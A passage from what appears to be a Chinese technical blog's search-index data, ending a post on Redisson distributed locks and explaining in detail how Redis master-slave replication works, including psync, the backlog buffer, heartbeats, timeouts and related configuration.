实现的效果更好些，虽然基本原理都一样，但是它帮我们屏蔽了内部的执行细节。 在等待申请锁资源的进程等待申请锁的实现上也做了一些优化，减少了无效的锁申请，提升了资源的利用率。  方案缺点  使用 Redisson 实现分布式锁方案最大的问题就是如果你对某个 Redis Master 实例完成了加锁，此时 Master 会异步复制给其对应的 slave 实例。但是这个过程中一旦 Master 宕机，主备切换，slave 变为了 Master。接着就会导致，客户端 2 来尝试加锁的时候，在新的 Master 上完成了加锁，而客户端 1 也以为自己成功加了锁，此时就会导致多个客户端对一个分布式锁完成了加锁，这时系统在业务语义上一定会出现问题，导致各种脏数据的产生。所以这个就是 Redis Cluster 或者说是 Redis Master-Slave 架构的主从异步复制导致的 Redis 分布式锁的最大缺陷（在 Redis Master 实例宕机的时候，可能导致多个客户端同时完成加锁）。Redisson有RedLock算法实现RedissonRedLock，所以这个问题在使用Redisson时不存在 有个别观点说使用 Watch Dog 机制开启一个定时线程去不断延长锁的时间对系统有所损耗（这里只是网络上的一种说法，博主查了很多资料并且结合实际生产并不认为有很大系统损耗，这个仅供大家参考）。  总结 以上就是基于 Redis 使用 Redisson 实现分布式锁的所有原理分析，希望可以帮助小伙伴们对分布式锁的理解有所加深。其实分析完源码后发现基于 Redis 自己手动实现一个简版的分布式锁工具也并不是很难，有兴趣的小伙伴可以试试。\n参考 Redisson 实现分布式锁原理分析 Redisson实现分布式锁原理 工作三年，小胖居然问我 Redisson 原理？真的过份！ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/redisson%E5%8E%9F%E7%90%86/","series":["Manual"],"tags":["Redis"],"title":"Redisson原理"},{"categories":["编程思想"],"content":"主从复制虽然实现数据冗余（是持久化之外的一种数据冗余方式）、故障恢复（手动切换）、读负载均衡等问题。但无法自动故障转移、写操作无法负载均衡、存储能力受到单机的限制。\n1. 主从复制概述 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。\n默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。\n主从复制的作用\n主从复制的作用主要包括：\n 数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。 故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。 负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。 高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。  2. 如何使用主从复制 为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。\n2.1 建立复制 需要注意，主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。\n从节点开启主从复制，有3种方式：\n（1）配置文件\n在从服务器的配置文件中加入：slaveof  \n（2）启动命令\nredis-server启动命令后加入 \u0026ndash;slaveof  \n（3）客户端命令\nRedis服务器启动后，直接通过客户端执行命令：slaveof  ，则该Redis实例成为从节点。\n上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。\n2.2 实例 准备工作：启动两个节点 方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：\n启动后可以看到：\n两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。\n建立复制 此时在6380节点执行slaveof命令，使之变为从节点：\n观察效果 下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。\n（1）首先在从节点查询一个不存在的key：\n（2）然后在主节点中增加这个key：\n（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：\n（4）然后在主节点删除这个key：\n（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：\n2.3 断开复制 通过slaveof  命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。\n从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。\n主节点打印日志如下：\n3. 主从复制的实现原理 上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。\n主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。\n3.1 连接建立阶段 该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。\n步骤1：保存主节点信息 从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。\n需要注意的是，slaveof是异步命令，从节点完成主节点ip和port的保存后，向发送slaveof命令的客户端直接返回OK**，实际的复制操作在这之后才开始进行。**\n这个过程中，可以看到从节点打印日志如下：\n步骤2：建立socket连接 从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：\n从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。\n主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。\n这个过程中，从节点打印日志如下：\n步骤3：发送ping命令 从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。\n从节点发送ping命令后，可能出现3种情况：\n（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。\n（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。\n（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。\n在主节点返回pong情况下，从节点打印日志如下：\n步骤4：身份验证 如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。\n如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。\n步骤5：发送从节点端口信息 身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。\n3.2 数据同步阶段 主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。\n数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。\n需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。\n3.3 命令传播阶段 数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。\n在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。\n延迟与不一致\n需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。\nrepl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。\n一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。\n4. 全量复制和部分复制【数据同步阶段】 在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。\n 全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。 部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。  4.1 全量复制 Redis通过psync命令进行全量复制的过程如下：\n（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行部分复制；具体判断过程需要在讲述了部分复制原理后再介绍。\n（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令\n（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；从节点首先清除自己的旧数据，然后载入接收的RDB文件，将数据库状态更新至主节点执行bgsave时的数据库状态\n（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态\n（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态\n下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。\n主节点的打印日志如下：\n从节点打印日志如下图所示：\n其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。\n通过全量复制的过程可以看出，全量复制是非常重型的操作：\n（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 深入学习Redis（2）：持久化 （2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗\n（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗\n4.2 部分复制 由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。\n部分复制的实现，依赖于三个重要的概念：\n（1）复制偏移量 主节点和从节点分别维护一个复制偏移量（offset），代表的是主节点向从节点传递的字节数；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。\noffset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。\n（2）复制积压缓冲区 复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。\n在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。\n由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。\n从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：\n 如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制； 如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。  （3）服务器运行ID(runid) 每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：\n主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：\n 如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)； 如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。  4.3 psync命令的执行 在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。\npsync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：\n（1）首先，从节点根据当前状态，决定如何调用psync命令：\n 如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制； 如果从节点之前执行了slaveof，则发送命令为psync  ，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。  （2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：\n 如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制； 如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可； 如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC  ，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。  4.4 部分复制演示 在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。\n网络中断\n网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。\n主节点日志如下：\n从节点日志如下：\n网络恢复\n网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。\n主节点日志如下：\n从节点日志如下：\n5. 心跳机制【命令传播阶段】 在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。\n5.1 主-从：PING 每隔指定的时间，主节点会向从节点发送PING命令，这个PING命令的作用，主要是为了让从节点进行超时判断。\nPING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。\n关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：\n但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：\n5.2 从-主：REPLCONF ACK 在命令传播阶段，**从节点会向主节点发送REPLCONF ACK命令，**频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：\n（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：\n（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。注意，offset和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。\n（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。\n6. 应用中的问题 6.1 读写分离及其中的问题 在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。\n（1）延迟与不一致问题 前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。\n在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。\n（2）数据过期问题 在单机版Redis中，存在两种删除策略：\n 惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。 定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。  在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。\nRedis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。\n（3）故障切换问题 在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。\n（4）总结 在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。\n6.2 复制超时问题 主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。\n超时判断意义\n在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：\n（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。\n（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。\n判断机制\n主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：\n（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。\n（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：\n 如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接； 如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接； 如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。  主从节点判断连接超时的相关源代码如下：\n/* Replication cron function, called 1 time per second. */ void replicationCron(void) { static long long replication_cron_loops = 0; /* Non blocking connection timeout? */ if (server.masterhost \u0026amp;\u0026amp; (server.repl_state == REDIS_REPL_CONNECTING || slaveIsInHandshakeState()) \u0026amp;\u0026amp; (time(NULL)-server.repl_transfer_lastio) \u0026gt; server.repl_timeout) { redisLog(REDIS_WARNING,\u0026#34;Timeout connecting to the MASTER...\u0026#34;); undoConnectWithMaster(); } /* Bulk transfer I/O timeout? */ if (server.masterhost \u0026amp;\u0026amp; server.repl_state == REDIS_REPL_TRANSFER \u0026amp;\u0026amp; (time(NULL)-server.repl_transfer_lastio) \u0026gt; server.repl_timeout) { redisLog(REDIS_WARNING,\u0026#34;Timeout receiving bulk data from MASTER... If the problem persists try to set the \u0026#39;repl-timeout\u0026#39; parameter in redis.conf to a larger value.\u0026#34;); replicationAbortSyncTransfer(); } /* Timed out master when we are an already connected slave? */ if (server.masterhost \u0026amp;\u0026amp; server.repl_state == REDIS_REPL_CONNECTED \u0026amp;\u0026amp; (time(NULL)-server.master-\u0026gt;lastinteraction) \u0026gt; server.repl_timeout) { redisLog(REDIS_WARNING,\u0026#34;MASTER timeout: no data nor PING received...\u0026#34;); freeClient(server.master); } //此处省略无关代码……  /* Disconnect timedout slaves. */ if (listLength(server.slaves)) { listIter li; listNode *ln; listRewind(server.slaves,\u0026amp;li); while((ln = listNext(\u0026amp;li))) { redisClient *slave = ln-\u0026gt;value; if (slave-\u0026gt;replstate != REDIS_REPL_ONLINE) continue; if (slave-\u0026gt;flags \u0026amp; REDIS_PRE_PSYNC) continue; if ((server.unixtime - slave-\u0026gt;repl_ack_time) \u0026gt; server.repl_timeout) { redisLog(REDIS_WARNING, \u0026#34;Disconnecting timedout slave: %s\u0026#34;, replicationGetSlaveName(slave)); freeClient(slave); } } } //此处省略无关代码……  } 　需要注意的坑\n下面介绍与复制阶段连接超时有关的一些实际问题：\n（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。\n（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。\n（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。\n6.3复制中断问题 主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。\n复制缓冲区溢出 前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-\u0026gt;复制缓冲区溢出导致连接中断-\u0026gt;重连-\u0026gt;全量复制-\u0026gt;复制缓冲区溢出导致连接中断……的循环。\n复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。\n当复制缓冲区溢出时，主节点打印日志如下所示：\n需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。\n6.4 各场景下复制的选择及优化技巧 在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。\n（1）第一次建立复制 此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。\n（2）主节点重启 主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。\n主节点宕机\n主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。\n实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。\n安全重启：debug reload\n在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。\n为了解决这个问题，Redis提供了debug reload的重启方式：**重启后，主节点的runid和offset****都不受影响，**避免了全量复制。\n如下图所示，debug reload重启后runid和offset都未受影响：\n但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。\n（3）从节点重启 从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。\n（4）网络中断 如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。\n第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF ACK来补充丢失的数据即可。\n第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。\n第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。\n6.5 复制相关的配置 这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。\n配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。\n（1）与主从节点都有关的配置 首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：\n  slaveof  ：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。\n  repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。\n  （2）主节点相关配置   repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。\n  repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。\n  client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。\n  repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。\n  masterauth ：与连接建立阶段的身份验证有关，见前面的介绍。\n  repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。\n  repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。\n  repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行部分复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。\n  min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。\n  （3）从节点相关配置   slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。\n  slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。\n  6.6 单机内存大小限制 在 深入学习Redis（2）：持久化 